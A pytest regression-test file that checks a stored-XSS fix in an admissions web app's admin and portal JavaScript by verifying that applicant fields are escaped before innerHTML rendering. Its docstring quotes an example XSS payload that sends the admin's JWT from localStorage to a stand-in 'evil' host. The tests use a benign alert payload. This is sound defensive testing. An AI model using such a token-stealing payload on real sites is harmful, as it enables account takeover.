"""
Regression tests for the stored-XSS fix (CLAUDE.md Phase 1, item 1).

Bug: admin.js / portal.js built innerHTML strings straight out of
attacker-controlled applicant fields (full_name, program, statement, ...).
A name like ``<img src=x onerror=fetch('//evil?t='+localStorage.dsadps_admin_token)>``
would execute in the admin's browser as soon as the dashboard rendered it,
stealing the admin JWT out of localStorage.

Fix: app/static/js/api.js now exports an `esc()` helper (HTML-entity
escaping) and every applicant-controlled value interpolated into an
innerHTML template in admin.js / portal.js is wrapped in it.

These tests are static/behavioural checks runnable under plain pytest
(no browser/DOM needed): they (1) execute the real esc() implementation
under Node to prove it neutralizes a payload, and (2) scan the two
frontend files to make sure every known applicant field is still wrapped
in esc() wherever it is interpolated into a template literal - so the
bug can't quietly come back during future edits.
"""
import re
import shutil
import subprocess
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[1]
API_JS = REPO_ROOT / "app" / "static" / "js" / "api.js"
ADMIN_JS = REPO_ROOT / "app" / "static" / "js" / "admin.js"
PORTAL_JS = REPO_ROOT / "app" / "static" / "js" / "portal.js"

NODE = shutil.which("node")


def _extract_esc_function(js_source: str) -> str:
    match = re.search(r"function esc\(value\)\s*\{.*?\n\}", js_source, re.DOTALL)
    assert match, "esc() helper not found in api.js"
    return match.group(0)


@pytest.mark.skipif(NODE is None, reason="Node.js not available to execute esc()")
def test_esc_neutralizes_script_payload():
    esc_source = _extract_esc_function(API_JS.read_text(encoding="utf-8"))
    payload = "<img src=x onerror=\"alert('xss')\">"
    script = f"{esc_source}\nprocess.stdout.write(esc({payload!r}));"

    result = subprocess.run(
        [NODE, "-e", script], capture_output=True, text=True, timeout=10
    )

    assert result.returncode == 0, result.stderr
    escaped = result.stdout
    assert "<img" not in escaped
    assert "&lt;img" in escaped
    assert "&quot;" in escaped  # attribute-breaking quotes are escaped too
    assert "&#39;" in escaped


@pytest.mark.skipif(NODE is None, reason="Node.js not available to execute esc()")
def test_esc_passes_through_safe_values_and_handles_nullish():
    esc_source = _extract_esc_function(API_JS.read_text(encoding="utf-8"))
    script = (
        f"{esc_source}\n"
        "process.stdout.write(JSON.stringify([esc('Priya Patil'), esc(null), "
        "esc(undefined), esc(42)]));"
    )

    result = subprocess.run(
        [NODE, "-e", script], capture_output=True, text=True, timeout=10
    )

    assert result.returncode == 0, result.stderr
    assert result.stdout == '["Priya Patil","","","42"]'


def test_api_js_exposes_esc_globally():
    # admin.js / portal.js call the bare `esc(...)` identifier, relying on
    # api.js having attached it to `window`. If this export is ever removed,
    # every call site below breaks silently at runtime.
    source = API_JS.read_text(encoding="utf-8")
    assert "window.esc = esc;" in source


# Applicant/admin-controlled fields that are rendered via innerHTML and must
# never be interpolated without going through esc(...) first.
ADMIN_JS_FIELDS = [
    "full_name", "email", "ip_address", "reference_code", "program",
    "status", "final_action", "phone", "date_of_birth", "city",
    "street_address", "highest_qualification", "gpa_score", "statement",
    "xgb_prediction", "ai_status",
]

PORTAL_JS_FIELDS = [
    "full_name", "email", "phone", "date_of_birth", "gender", "nationality",
    "highest_qualification", "previous_institution", "passing_year",
    "academic_stream", "gpa_score", "program", "intake_term", "study_mode",
    "street_address", "city", "state", "country", "emergency_contact",
    "statement", "status", "reference_code",
]


def _innerhtml_template_regions(source: str):
    """Return the contents of every template literal assigned to
    `.innerHTML`, since that's the actual XSS sink - `${...}` used for a
    className comparison or passed to Toast.show() (which uses
    textContent) is not attacker-reachable and shouldn't be flagged."""
    regions = []
    for m in re.finditer(r"\.innerHTML\s*=", source):
        tick_start = source.find("`", m.end())
        if tick_start == -1 or tick_start - m.end() > 300:
            continue  # not a template-literal assignment (e.g. a plain string)
        between = source[m.end():tick_start]
        if ";" in between:
            continue  # the statement already ended (e.g. a plain-string
            # innerHTML assignment) before this backtick, which belongs to
            # a later, unrelated statement
        tick_end = source.find("`", tick_start + 1)
        if tick_end == -1:
            continue
        regions.append(source[tick_start + 1 : tick_end])
    return regions


def _unescaped_interpolations(source: str, field: str):
    """Find `${...}` expressions inside innerHTML template literals that
    reference `.<field>` but are not wrapped in esc(...).

    A `.field` immediately followed by `===`/`!==` (e.g.
    ``item.status === 'allow' ? 'badge-success' : 'badge-warning'``) is a
    comparison whose *output* is always one of the fixed string literals,
    never the field's raw value, so it is not an XSS sink and is excluded.
    """
    # `${` then any run of chars that never starts a bare "esc(" call,
    # followed by `.<field>` on a word boundary that isn't immediately
    # used in an equality comparison.
    pattern = re.compile(
        r"\$\{(?:(?!esc\()[^${}])*\."
        + re.escape(field)
        + r"\b(?!\s*[=!]==)"
    )
    hits = []
    for region in _innerhtml_template_regions(source):
        hits.extend(pattern.findall(region))
    return hits


@pytest.mark.parametrize("field", ADMIN_JS_FIELDS)
def test_admin_js_escapes_applicant_field(field):
    source = ADMIN_JS.read_text(encoding="utf-8")
    bad = _unescaped_interpolations(source, field)
    assert not bad, (
        f"admin.js interpolates `.{field}` into a template without esc(): {bad!r} "
        "- this reintroduces the stored-XSS bug from CLAUDE.md Phase 1 item 1."
    )


@pytest.mark.parametrize("field", PORTAL_JS_FIELDS)
def test_portal_js_escapes_applicant_field(field):
    source = PORTAL_JS.read_text(encoding="utf-8")
    bad = _unescaped_interpolations(source, field)
    assert not bad, (
        f"portal.js interpolates `.{field}` into a template without esc(): {bad!r} "
        "- this reintroduces the stored-XSS bug from CLAUDE.md Phase 1 item 1."
    )


def test_toast_uses_textcontent_not_innerhtml_for_title_and_message():
    # Toast.show() displays arbitrary error messages / filenames; it must
    # not put them into innerHTML.
    source = API_JS.read_text(encoding="utf-8")
    assert "toast.querySelector('.toast-title').textContent = title;" in source
    assert "messageEl.textContent = message;" in source
